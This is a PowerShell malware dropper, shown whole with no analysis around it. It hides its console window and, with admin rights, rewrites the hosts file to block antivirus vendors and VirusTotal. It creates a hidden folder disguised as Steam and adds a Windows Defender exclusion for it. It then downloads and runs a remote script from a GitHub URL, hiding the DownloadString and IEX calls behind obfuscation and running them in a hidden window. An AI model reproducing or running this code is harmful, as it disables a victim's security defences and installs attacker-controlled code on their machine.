Add-Type @"
    using System;
    using System.Runtime.InteropServices;
    public class ConsoleWindowUtils {
        [DllImport("kernel32.dll")]
        public static extern IntPtr GetConsoleWindow();
        
        [DllImport("user32.dll")]
        public static extern IntPtr GetParent(IntPtr hWnd);

        [DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        
        public static IntPtr GetTargetWindow() {
            IntPtr consoleWindow = GetConsoleWindow();
            IntPtr parentWindow = GetParent(consoleWindow);
            
            if (parentWindow == IntPtr.Zero) {
                return consoleWindow;
            }
            return parentWindow;
        }
    }
"@

[ConsoleWindowUtils]::ShowWindow([ConsoleWindowUtils]::GetTargetWindow(), 0) | Out-Null

function IsAdmin { # Checks if the program has administrator permissions or not
    $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = [Security.Principal.WindowsPrincipal]::new($identity)
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function BlockSites { # Tries to block AV related sites using hosts file
    if (IsAdmin) {
        $call = & reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /V DataBasePath
        if ($LASTEXITCODE -ne 0) {
            $hostdirpath = Join-Path "System32" "drivers\etc"
        } else {
            $hostdirpath = ($call | Select-Object -Last 1).Split()[-1].Split('\')[1..($call.Count - 1)] -join '\'
        }
        $hostfilepath = Join-Path $env:systemroot $hostdirpath "hosts"
        if (-not (Test-Path $hostfilepath)) {
            return
        }
        $data = Get-Content $hostfilepath

        $BANNED_SITES = @("virustotal.com", "avast.com", "totalav.com", "scanguard.com", "totaladblock.com", "pcprotect.com", "mcafee.com", "bitdefender.com", "us.norton.com", "avg.com", "malwarebytes.com", "pandasecurity.com", "avira.com", "norton.com", "eset.com", "zillya.com", "kaspersky.com", "usa.kaspersky.com", "sophos.com", "home.sophos.com", "adaware.com", "bullguard.com", "clamav.net", "drweb.com", "emsisoft.com", "f-secure.com", "zonealarm.com", "trendmicro.com", "ccleaner.com")
        $newdata = @()
        foreach ($i in $data) {
            if ($BANNED_SITES | Where-Object { $i -like "*$_*" }) {
                continue
            } else {
                $newdata += $i
            }
        }

        foreach ($i in $BANNED_SITES) {
            $newdata += "0.0.0.0 $i"
            $newdata += "0.0.0.0 www.$i"
        }

        $newdata = $newdata -join "`n" -replace "`n`n", "`n"

        attrib -r $hostfilepath # Removes read-only attribute from hosts file
        Set-Content -Path $hostfilepath -Value $newdata
        attrib +r $hostfilepath # Adds read-only attribute to hosts file
    }
}

BlockSites

$rdir = "$env:SystemDrive\ProgramData\Steam"
$dir = "$rdir..{21EC2020-3AEA-1069-A2DD-08002B30309D}"
$startupfolder = (New-Object -ComObject WScript.Shell).SpecialFolders("AllUsersStartup")
New-Item -ItemType Directory -Path $dir
Add-MpPreference -ExclusionPath $dir
attrib +h +s $dir

$shellcode = ("https://raw.githubusercontent.com/EVIL-D-E-V/M/refs/heads/main/shellcode/Xclienta.ps")
$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru


